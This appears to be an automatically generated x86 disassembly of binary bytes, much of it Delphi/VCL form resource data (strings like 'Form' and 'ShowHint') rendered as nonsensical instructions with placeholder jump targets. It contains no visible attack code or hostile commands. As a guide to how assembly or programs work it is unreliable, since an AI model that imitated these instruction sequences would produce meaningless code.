add [ eax - 0x7 ] dh
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ ecx ] bl
inc esi
add [ eax ] ah
jns r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ edx + 0x1a004635 ] ch
aaa
inc esi
add al bh
add al [ eax ]
add al ah
and al 0x46
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
xor eax [ esi ]
or [ ebx ] cl
push esp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
push 0xaa640046
inc esi
add al bl
inc esi
add [ eax - 0x5b ] ch
inc esi
add [ eax - 0x74 ] cl
inc esi
add [ edi ] bl
inc esi
add [ eax ] al
jb r-xdata
add [ edx + edx - 0x7a1bffbb ] bh
inc esi
add [ ecx + ecx * 4 + 0x46 ] al
add [ eax ] al
mov [ esi ] al
push esp
adc eax [ ebp ]
pop eax
adc eax [ ebp ]
jl r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
inc esp
add ah al
inc ebp
add [ edi + ebp * 2 ] bl
inc esi
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0x10
jo r-xdata
mov al 0x48
inc ebp
add [ eax - 0x37 ] bh
add [ eax + 0x30004511 ] bh
inc esi
sub_4628b0
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410500
imul esp [ edi + 0x6e ] r-xdata
popad
add [ eax ] al
dec [ eax + 0x240044c9 ]
0x44
sub_4628d6
add [ eax ] al
add [ eax + 0x3 ] al
push cs
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
xor [ ebx + 0x45 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
[ esp + ebx * 2 + 0x46 ]
add [ eax ] al
adc eax 0x65420a00
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
pop esp
add [ eax ] al
xchg esi eax
inc esp
add [ ecx + eax ] ah
push [ eax ]
dec ebx
inc ebp
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
hlt
jb r-xdata
jne r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
je r-xdata
add [ eax + 0x42080016 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2065646f
daa
inc esi
add [ eax ] ah
add al [ eax ]
dec esp
bound eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
insb
dec edi
add [ eax ] al
add [ ebx ] bl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax - 0x700ffff ] ch
sub [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] eax
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
mov eax 0x7a004480
add [ eax ] al
add bh bh
jpe r-xdata
je r-xdata
add bh bh
int3
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
sbb [ esi ] 0x0
add eax 0x6f6c6f43
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
inc [ ecx ]
insb
lodsb [ gs : esi ]
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ edx ] cl
inc edx
jbe r-xdata
xchg edi eax
inc esp
add [ ebp + 0x1 ] ah
add bh bh
movsb [ edi ] [ esi ]
dec ebx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + 0x65 ] eax
jbe r-xdata
add [ eax ] al
add [ eax + eax ] dl
insb
inc ebp
jae r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ edi + edi + 0x45 ]
add [ eax + 0x453f ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001f ] al
je r-xdata
jb r-xdata
call esp
xlat
jae r-xdata
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0xc4ff0001
dec ebx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add bh bh
insb
pop esp
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
str [ edx ]
inc ecx
jne r-xdata
xchg esi eax
inc esp
add [ ebx + 0x1 ] ah
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
xor eax [ esp + 0x24 ]
inc edx
add [ eax ] ch
add bh bh
sub bh dl
inc esp
add [ eax ] bh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
inc esp
add al dh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001e ] al
outsd
insb
outsd
add bh bh
aam 0xd7
jb r-xdata
cwde
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ ecx + 0x75 ] al
je r-xdata
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
je r-xdata
jne r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
add al 0x20
inc edx
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
xchg [ eax + eax - 0x65 ] eax
add [ eax ] al
[ ebx + 0x1ff0000 ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
clc
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
push esp
aad 0x44
jo r-xdata
adc [ eax ] al
0xa8ff0000 0x44d7
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : esi ] cl
outsb
je r-xdata
sub [ edi ] 0x0
push cs
jpe r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x40 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
js r-xdata
add [ eax ] al
nop
push ebp
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x94656c62
mov es [ eax + eax - 0x40 ]
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ ebp + edx * 8 + 0x44 ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080028 ] al
push 0x6948776f
outsb
je r-xdata
aas
inc ebp
add [ eax ] bh
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
adc [ eax ] al
test eax 0x8cff0001
aas
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
push esp
push eax
outsd
jo r-xdata
outsb
xchg [ eax + eax - 0x48 ] eax
push eax
popad
jo r-xdata
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090027 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul ebp [ esi + 0x74 ] r-xdata
mov eax 0x3800453f
outsd
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
push eax
outsb
je r-xdata
inc edi
je r-xdata
nop
push ebp
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070037 ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x4 ] bp
mov eax [ eax + eax + 0x18 ]
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
mov eax [ eax + eax - 0x18 ]
add [ eax ] al
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
push 0xe0004489
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0x686f666e
mov [ eax + eax - 0x30 ] eax
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003a ] al
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
add bh bh
shl dh 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002d ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
push ebp
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
pushad
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500a00
insb
sbb al 0x90
inc esp
outsd
ja r-xdata
dec edi
push ebp
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
push ebx
je r-xdata
push edi
loopne r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
jo r-xdata
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ esi ] cl
outsd
outsd
imul esi [ eax + 0x68 ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
jb r-xdata
inc esp
outsd
arpl [ ebx - 0x4c ] bp
mov eax [ eax + eax + 0x10 ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
outsb
push ebx
je r-xdata
sbb al 0x90
inc esp
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e003f ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
add al bl
add [ eax ] al
jbe r-xdata
mov eax [ eax + eax + 0x8 ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0039 ] al
outsb
mov es [ eax + eax - 0x30 ]
add [ eax ] eax
call eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0030 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
mov [ eax + eax - 0x48 ] es
add [ eax ] eax
invd
dec ecx
insb
inc esi
add bh bh
dec [ ebx + 0x4630c4c0 ]
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
add [ edi ] cl
or [ ecx + 0x4f ] cl
inc esi
jb r-xdata
inc esp
jb r-xdata
push edi
push 0x556c6565
jo r-xdata
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
insd
dec esp
adc [ eax ] eax
add ecx eax
loope r-xdata
ficom [ edx - 0x30 ]
adc [ esi - 0x50dfff5a ] ebx
dec edi
push eax
lea eax [ eax + eax - 0x10 ]
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0c00
dec ebp
outsd
jne r-xdata
push ebp
inc ecx
add al bh
add [ eax ] al
outsd
jb r-xdata
inc eax
add [ ecx + esi + 0x46 ] al
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
cmp eax 0x4605da82
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
int 0xda
add [ ebx ] al
add [ eax ] al
add [ eax + 0x31 ] al
inc esi
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
dec ebp
jae r-xdata
add [ eax ] eax
outsb
jb r-xdata
add [ eax ] cl
dec edi
outsb
push edx
jae r-xdata
inc esp
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10003e ] al
outsb
push edi
push 0x1c6c6565
nop
push eax
outsd
jae r-xdata
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp + 0x30f40040 ]
inc esi
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
add bh bh
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
outsd
jb r-xdata
inc esi
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rcl [ eax + 0xf004630 ] 0xd
dec ecx
inc esp
jae r-xdata
dec edi
jpe r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
dec edi
insb
jo r-xdata
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
mov eax eax
xchg esp eax
xor [ esi ] eax
push es
inc esi
outsd
jb r-xdata
popad
js r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
add [ eax ] cl
mov esp 0x448d
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0041 ] al
outsb
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0xa004631 ] ch
jo r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
push cs
jo r-xdata
bound ebp [ ecx + 0x4d ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al dh
xor [ esi ] al
or [ esi + 0x73 ] ah
dec esi
outsd
jb r-xdata
insb
add [ gs : eax ] eax
insb
jns r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
outsd
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc esp
xor al [ esi ]
or [ ebp + ebp * 2 + 0x44 ] esp
inc esp
popa
jne r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
rcl [ ecx + esi + 0xc060046 ] 0x54
or al 0x54
inc esi
add [ esi ] al
jns r-xdata
xor al [ esi ]
push es
inc eax
add [ ebx + esi ] ch
outsd
xor al [ esi ]
add ecx [ ebx ]
add eax 0x6d726f46
jo r-xdata
jo r-xdata
arpl [ ecx + 0x6c ] sp
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6004632 ] bl
inc ebx
outsb
je r-xdata
inc esi
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
xor [ esi ] eax
nop
lodsb [ esi ]
inc eax
je r-xdata
je r-xdata
jae r-xdata
add [ eax ] al
add [ edx + esi + 0x46 ] al
add [ ecx ] cl
insd
inc esp
je r-xdata
popad
dec ebp
je r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
inc esi
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
sub al 0x33
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
xor al [ esi ]
push esp
push eax
dec edi
ja r-xdata
jb r-xdata
dec eax
je r-xdata
nop
insd
popad
jb r-xdata
inc esp
jae r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
jb r-xdata
jo r-xdata
jb r-xdata
lea eax [ eax ]
inc esp
xor [ esi ] eax
add ecx [ ebx ]
push esp
inc edx
outsd
inc esi
outsd
jb r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
jae r-xdata
outsb
je r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add al ah
xor al [ esi ]
jo r-xdata
push cs
je r-xdata
jb r-xdata
jb r-xdata
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
loopne r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
in al 0x32
inc esi
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
xor [ esi ] eax
add ecx [ ecx ]
push esp
jae r-xdata
jae r-xdata
jo r-xdata
loopne r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
xchg esp eax
xor al 0x46
inc ebp
jbe r-xdata
add cl [ eax ]
push es
popad
outsb
add [ eax ] al
jb r-xdata
add [ ebx ] al
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
insd
add [ eax ] al
cwde
jae r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] ch
inc eax
add al ah
xor al [ esi ]
lea eax [ eax ]
jo r-xdata
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc esi
add [ esi ] al
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
inc ebp
add [ esp + ebp * 2 ] ch
inc esi
add [ eax - 0x75 ] dh
inc ecx
add [ eax + ebp * 2 + 0x46 ] bh
add [ eax - 0x3bffb998 ] bh
imul eax [ esi ] sub_44d41c
push eax
adc [ edx ] eax
cmp al 0x72
inc esi
add [ eax ] dh
push cs
inc edx
add ah bl
lodsd [ esi ]
inc esi
add [ ebx ] dl
inc esi
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
add [ eax ] bh
adc [ edx ] eax
mov al [ 0x54004664 ]
inc esi
pop es
dec ecx
outsb
je r-xdata
mov [ esi ] eax
add [ eax + 0x13540046 ] cl
inc ebp
add [ eax + 0x13 ] bl
inc ebp
add [ edx + ecx * 4 + 0x46 ] bh
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x40044d5 ] dl
jb r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
jo r-xdata
inc ebp
jbe r-xdata
jne r-xdata
popad
je r-xdata
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax ] al
adc [ eax ] al
nop
mov ah 0x33
inc esi
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
adc [ eax + 0x6f ] esi
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
inc si
add [ eax - 0x3fffbfcd ] bh
mov al [ esi ]
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
mov esp 0x34004666
dec ecx
push esp
jb r-xdata
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] ch
add [ eax ] al
add [ eax - 0x6f ] dh
inc esi
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi - 0x597bffbb ] ch
inc esi
add [ eax ] dl
pop ebx
inc esi
add al al
pop ebp
inc esi
add [ edi + edx * 4 + 0x46 ] ah
add [ eax + 0x1c004667 ] ah
adc [ ebp ] eax
xor [ esi ] bh
inc ebp
add al dl
jo r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c004635 ] cl
aaa
inc esi
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x34940040 ] cl
inc esi
jbe r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
outsb
je r-xdata
outsd
jae r-xdata
outsd
outsd
insb
outsb
je r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
inc ebp
add al cl
salc
inc esp
add [ edx + esi * 2 + 0x46 ] bh
add [ eax - 0x7 ] dh
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ ecx ] bl
inc esi
add [ eax ] ah
jns r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ edx + 0x1a004635 ] ch
aaa
inc esi
add al bh
add al [ eax ]
add al ah
and al 0x46
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
xor eax [ esi ]
or [ ebx ] cl
push esp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
push 0xaa640046
inc esi
add al bl
inc esi
add [ eax - 0x5b ] ch
inc esi
add [ eax - 0x74 ] cl
inc esi
add [ edi ] bl
inc esi
add [ eax ] al
jb r-xdata
add [ edx + edx - 0x7a1bffbb ] bh
inc esi
add [ ecx + ecx * 4 + 0x46 ] al
add [ eax ] al
mov [ esi ] al
push esp
adc eax [ ebp ]
pop eax
adc eax [ ebp ]
jl r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
inc esp
add ah al
inc ebp
add [ edi + ebp * 2 ] bl
inc esi
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0x10
jo r-xdata
mov al 0x48
inc ebp
add [ eax - 0x37 ] bh
add [ eax + 0x30004511 ] bh
inc esi
sub_4638b9
